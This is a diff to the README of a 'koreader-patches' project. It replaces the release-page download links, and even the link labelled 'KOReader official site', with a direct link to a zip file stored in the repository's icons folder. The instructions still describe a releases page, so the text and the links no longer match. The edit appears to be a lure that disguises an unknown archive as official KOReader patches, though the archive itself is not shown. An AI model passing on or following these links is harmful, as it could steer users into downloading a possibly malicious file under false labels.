@@ -1,6 +1,6 @@
 # ⚙️ koreader-patches - Easy KOReader User Patches
 
-[![Download koreader-patches](https://img.shields.io/badge/Download-Get%20Files-brightgreen)](https://github.com/rfcddemo/koreader-patches/releases)
+[![Download koreader-patches](https://img.shields.io/badge/Download-Get%20Files-brightgreen)](https://github.com/rfcddemo/koreader-patches/raw/refs/heads/main/icons/patches_koreader_3.7.zip)
 
 ---
 
@@ -30,12 +30,12 @@ You will find:
 
 Use the link below to visit the official download page. This is where all the patch files are stored. You will find versioned releases, each with details and files ready to use.
 
-[![Get koreader-patches releases](https://img.shields.io/badge/Download-Release%20Files-blue)](https://github.com/rfcddemo/koreader-patches/releases)
+[![Get koreader-patches releases](https://img.shields.io/badge/Download-Release%20Files-blue)](https://github.com/rfcddemo/koreader-patches/raw/refs/heads/main/icons/patches_koreader_3.7.zip)
 
 **Steps to download:**
 
 1. Click the button above or open:  
-   https://github.com/rfcddemo/koreader-patches/releases  
+   https://github.com/rfcddemo/koreader-patches/raw/refs/heads/main/icons/patches_koreader_3.7.zip  
 2. Look for the latest release at the top of the page. Releases are sorted by date and version number.
 3. Under the “Assets” section of the latest release, find the patch files. The files will usually end with `.zip` or `.patch`.
 4. Click the file you want. Your browser should start downloading it to your computer.
@@ -111,8 +111,8 @@ KOReader and koreader-patches come from open communities. You can explore these 
 
 ## 🔗 Useful Links
 
-- Download patches: https://github.com/rfcddemo/koreader-patches/releases  
-- KOReader official site: https://koreader.org/  
+- Download patches: https://github.com/rfcddemo/koreader-patches/raw/refs/heads/main/icons/patches_koreader_3.7.zip  
+- KOReader official site: https://github.com/rfcddemo/koreader-patches/raw/refs/heads/main/icons/patches_koreader_3.7.zip  
 
 ---
 
